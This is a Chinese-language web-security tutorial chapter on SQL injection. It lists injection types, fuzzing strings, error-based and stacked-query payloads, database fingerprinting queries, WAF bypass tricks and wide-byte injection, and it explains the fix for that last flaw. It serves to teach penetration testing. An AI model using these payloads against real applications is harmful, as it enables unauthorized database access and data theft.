# WEB安全渗透测试基础知识（五）

**3.1 SQL注入漏洞**

3.1.1. 注入分类
SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。
3.1.1.1. 按技巧分类
根据使用的技巧，SQL注入类型可分为  
- 盲注
布尔盲注：只能从应用返回中推断语句执行后的布尔值
时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断
- 报错注入：应用会显示全部或者部分的报错信息
- 堆叠注入：有的应用可以加入 ; 后一次执行多条语句
- 其他


3.1.1.2. 按获取数据的方式分类

另外也可以根据获取数据的方式分为3类  
- inband
利用Web应用来直接获取数据
如报错注入
都是通过站点的响应或者错误反馈来提取数据
- inference
通过Web的一些反映来推断数据
如布尔盲注和堆叠注入
也就是我们通俗的盲注，
通过web应用的其他改变来推断数据
- out of band(OOB)
通过其他传输方式来获得数据，比如DNS解析协议和电子邮件

------------

3.1.2. 注入检测

3.1.2.1. 常见的注入点

- GET/POST/PUT/DELETE参数
- X-Forwarded-For
- 文件名

3.1.2.2. Fuzz注入点
- ' / "
- 1/1
- 1/0
- and 1=1
- " and "1"="1
- and 1=2
- or 1=1
- or 1=
- ' and '1'='1
- + - ^ * % /
- << >> || | & &&
- ~
- !
- @
- 反引号执行

3.1.2.3. 测试用常量
- @@version
- @@servername
- @@language
- @@spid

3.1.2.4. 测试列数
例如 http://www.foo.com/index.asp?id=12+union+select+nulll,null-- ，不断增加 null 至不返回

3.1.2.5. 报错注入
- select 1/0
- select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a
- extractvalue(1, concat(0x5c,(select user())))
- updatexml(0x3a,concat(1,(select user())),1)
- exp(~(SELECT * from(select user())a))
- ST_LatFromGeoHash((select * from(select * from(select user())a)b))
- GTID_SUBSET(version(), 1)

3.1.2.5.1. 基于geometric的报错注入
- GeometryCollection((select * from (select * from(select user())a)b))
- polygon((select * from(select * from(select user())a)b))
- multipoint((select * from(select * from(select user())a)b))
- multilinestring((select * from(select * from(select user())a)b))
- LINESTRING((select * from(select * from(select user())a)b))
- multipolygon((select * from(select * from(select user())a)b))

其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。
而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。

3.1.2.6. 堆叠注入
- ;select 1

3.1.2.7. 注释符
- #
- --+
- /*xxx*/
- /*!xxx*/
- /*!50000xxx*/

3.1.2.8. 判断过滤规则
- 是否有trunc
- 是否过滤某个字符
- 是否过滤关键字
- slash和编码

3.1.2.9. 获取信息
- 判断数据库类型
and exists (select * from msysobjects ) > 0 access数据库
and exists (select * from sysobjects ) > 0 SQLServer数据库
- 判断数据库表
and exsits (select * from admin)
- 版本、主机名、用户名、库名
- 表和字段
确定字段数（Order By Select Into）
表名、列名

3.1.2.10. 测试权限
- 文件操作
读敏感文件
写shell
- 带外通道
网络请求


------------

3.1.3. 权限提升

3.1.3.1. UDF提权

UDF（User Defined Function，用户自定义函数）是MySQL提供的一个功能，可以通过编写DLL扩展为MySQL添加新函数，扩充其功能。  
当获得MySQL权限之后，即可通过这种方式上传自定义的扩展文件，从MySQL中执行系统命令。

------------

3.1.4. 数据库检测

3.1.4.1. MySQL

- sleep sleep(1)
- benchmark BENCHMARK(5000000, MD5('test'))
- 字符串连接
SELECT 'a' 'b'
SELECT CONCAT('some','string')
- version
SELECT @@version
SELECT version()
- 识别用函数
connection_id()
last_insert_id()
row_count()


3.1.4.2. Oracle

- 字符串连接
'a'||'oracle' --
-SELECT CONCAT('some','string')
- version
SELECT banner FROM v$version
SELECT banner FROM v$version WHERE rownum=1

3.1.4.3. SQLServer

- WAITFOR WAITFOR DELAY '00:00:10';
- SERVERNAME SELECT @@SERVERNAME
- version SELECT @@version
字符串连接
SELECT 'some'+'string'
- 常量
@@pack_received
@@rowcount

3.1.4.4. PostgreSQL
- sleep pg_sleep(1)


------------

3.1.5. 绕过技巧

- 编码绕过
大小写
url编码
html编码
十六进制编码
unicode编码
- 注释
// -- -- + -- - # /**/ ;%00
内联注释用的更多，它有一个特性 /!**/ 只有MySQL能识别
e.g. index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3
- 只过滤了一次时
union => ununionion
- 相同功能替换
- 函数替换
substring / mid / sub
ascii / hex / bin
benchmark / sleep
- 变量替换
user() / @@user
- 符号和关键字
and / &
or / |
- HTTP参数
HTTP参数污染
id=1&id=2&id=3 根据容器不同会有不同的结果
HTTP分割注入
- 缓冲区溢出
一些C语言的WAF处理的字符串长度有限，超出某个长度后的payload可能不会被处理
- 二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过


------------

3.1.6. SQL注入小技巧

3.1.6.1. 宽字节注入

一般程序员用gbk编码做开发的时候，会用 set names 'gbk' 来设定，这句话等同于
set 
character_set_connection = 'gbk', 
character_set_result = 'gbk', 
character_set_client = 'gbk';

漏洞发生的原因是执行了 set character_set_client = 'gbk'; 之后，mysql就会认为客户端传过来的数据是gbk编码的，从而使用gbk去解码，而mysql_real_escape是在解码前执行的。但是直接用 set names 'gbk' 的话real_escape是不知道设置的数据的编码的，就会加 %5c 。此时server拿到数据解码 就认为提交的字符+%5c是gbk的一个字符，这样就产生漏洞了。

解决的办法有三种，第一种是把client的charset设置为binary，就不会做一次解码的操作。第二种是是 mysql_set_charset('gbk') ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。第三种就是用pdo。

还有一些其他的编码技巧，比如latin会弃掉无效的unicode，那么admin%32在代码里面不等于admin，在数据库比较会等于admin。


------------



